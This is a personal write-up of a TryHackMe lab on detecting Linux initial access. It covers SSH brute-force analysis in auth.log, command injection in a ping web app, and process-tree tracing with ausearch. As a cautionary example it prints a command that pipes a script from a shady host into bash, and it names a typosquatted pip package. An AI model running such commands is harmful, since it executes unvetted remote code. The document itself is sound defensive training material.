---
title: Linux threat detection one
platform: TryHackMe
difficulty: Medium
date: 2026-07-27
tags: [Linux Security, Threat Detection, Initial Access]
summary: A write up about threat detection for Initial Access on Linux machines
---

# Linux threat detection one


## Initial Access via SSH
An exposed SSH is one of the most popular Inital Access methods on Linux servers (T1133). Nearly every internet-facing Linux machine has SSH enable with Shodan (2025) reporting over 40 million machines.

1. Common risks when using a key based auth:
    - Threat actors access a service or source code where private SSH keys have been stored (like a GitHub repository or Ansible automation server containing SSH credentials)
    - Threat actors steal SSH keyrs to a server by infecting an admin's laptop with a data centre
2. Additiona risks when using a password-based auth:
    - An IT admin sets a weak SSH password for a quick test and forgets to revert the change
    - An IT support enables SSH fo a contractor who sets the password to "123456789"
    - A network engineer accidentally exposes an old, insecure SSH server to the internet.

Most real world attacks are usually one of the two above scenarios, however more advanced risks like a vulnerability in the SSH server itself has been exploited before like Erlang/OTP or SSH session hijacking.

### Exercises
**When did the ubuntu user log in via SSH for the first time**
Using "cat /var/log/auth.log | grep Accepted | grep ssh" gave me all the logs that contained both accepted and ssh and scrolling towards the top gives me the first time a user logged into ssh
![linuxinitial1](/static/images/linxinital1.png)

## Detecting SSH attacks
Similar to RDP, SSH attacks follow a similiar pattern.
For weak passwords a slew of failed password attempts followed by a successfull one in rapid succession in a small time frame indicates a brute-force.

Detecting SSH attacks requires looking at SSH logins an answering the following:
- Username: who owns the user? Is it expected for them to log in at this time and from this IP?
- Source IP: What do TI tools and asset lookups say about the IP? is it trusted or malicious?
- Login history: Was the login preceded by brute force or other suspicious system events?
- Next steps: Is the login suspicious? Should I analyze user actions following the login?

### Exercises
**When did the SSH password brute force start**
Using the command 'cat /var/log/auth.log | grep "Failed password" | grep ssh" shows me all ssh events relating to failed password attempts where I can scroll and find where the brute force started. Using this date and time to start building a time frame of the attack.
![linuxinital2](/static/images/linuxinital2.png)

**Which four users did the botnet attempt to breach**
This can be seen in the previous screenshot, the botnet attempts to breach root, roy, sol and user.

**Which IP managed to breach the root user**
For this I simply changed the previous command to 'cat /var/log/auth.log | grep "Accepted password" | grep root' which gave me one output which was the successful breach.
![linuxinital3](/static/images/linuxinital3.png)

## Initial Access via Services
Linux systems are typically used to host public-facing services or applications and also compromise the core of most firewall or VPN software meaning when one of these applications or services is compromised the entire Linux host is at risk. A few examples of this happening are:

- CV in Zimbra Collaboration, which allowed attackers to execute arbitrary OS commands
- Exposed Docker API port, which acted as an entry point in a series of cloud infrastrcture breaches
- CVE in Palo Alto firewalls, which granted attackers full control over the Linux-based firewall's OS
- WordPress "plugins" feature, which is often abused to upload malware like web shells to the system

Application logs can provide unique artifacts for analysis, such as:
- web logs for detecting a variety of web attacks
- database logs for suspicious SQL queries
- VPN logs for abnormal VPN login events

### Exercises
In this scenario a Linux machine is hosting a simple webapp called trypingme where you can ping the specified IP online. However there is no input filtering so a bad actor has injected linux commands.

**What is the path to the Python file the attacker attempted to open**
Navigating to the nginx logs and using "cat access.log | grep py" showed me the attacker attempted to open the /opt/trypingme/main.py path
![linuxinital4](/static/images/linux4.png)

**Looking inside the opened file, what's the flag you see there?**
Just following the path the attacker attempted shows the flag
![initalaccess5](/static/images/initalaccess5.png)

## Detecting Service Breach
Building a process tree analysis helps unwrap initial access. For example if whoami is executed, finding out who or why it was executed can be found out by building a process tree and trace the command back to its parent process. Example scenario:
- Start with inital proctitle=whoami, parent process has a PID of PPID=3905
- Search for pid=3905, where PPID=3898
- Searching for pid=3898 shows everything started from a Python web app in this scenario

This process tree can be built using audit logs, using the previous scneario this would like:
- ausearch -i -k whoami
- ausearch -i --pid 3905
- ausearch -i --pid 3898 (the PPID of this process is 1 meaning the OS process and the start of the tree)

In this scenario using the ppid 3898 and using grep 'proctitle' will show all the commands launched by the python web app. ausearch -i -ppid 3898 | grep 'proctitl'

### Exercises
**What is the PPID of the suspicious whoami command**
using "ausearch -i -x whoami", with the -x parameter I can search by executable names and show me ones that have executed.
![linuxinitial6](/static/images/linuxinital6.png)

**moving up the tree, what is the PID of the TryPingMe app**
using the parent process ID and searching for it gave me the parent process ID of the TryPingMe app
![linuxinital7](/static/images/linuxinital7.png)

**which program did the attacker use to open a reverse shell**
this is shown in the previous screenshot that the attacker used python to open a reverse shell

## Advanced inital access
Human-Led Attacks:
Since phishing and USB attacks won't necessarily work since OS servers are operated by techincal people human-led attacks are less common but still occur. Two examples are:
- An IT member looks for a solution to a server issue and desperately tries a script found in a forum: curl https://shadyforu.thm/fix.sh | bash. The consequence of this is the IT member did not check the script content and it turns out to be malware.
- A developer wants to install a Python "fastapi" package on the server, but mistypes a single letter: pip3 install fastpi. The mistyped package was malware, deliberately prepared and published by threat actors. 

Supply chain compromise (T1195) is also very possible with linux systems, some examples include:
- A backdoor in the XZ Utils library that is a part of SSH nearly led to a breach of millions of Linux servers
- A breach of the tj-actions redulted in a leak of thousands of secrets, like SSH keys and access tokens

Detecting the attack can be uncovered through a process tree analysis. start with a trigger (SIEM alert on a suspicious command or a connection to a known malicious IP) and build from a tree and trace which application or user initaiated the events.

## Conclusion
To conclude this room covers the common intial access techniques for Linux systems and how to discover if they are malicious or not using process tree analysis and log analysis.

Key Takeaways:

> Attacks on SSH are widespread but easy to detect using auth logs

> Exposed services are always a risk since they can lead to a whole Linux compromise

> While phishing is not common on Linux, human-led and supply attacks are still possible

> Process tree analysis is the best approach in identifying the Inital Access techniuques

---

- **Linux threat detection one**
- **TryHackMe**
- **Medium**
- **2026-07-27**
- **Linux Security, Threat Detection, Initial Access**
- **summary**
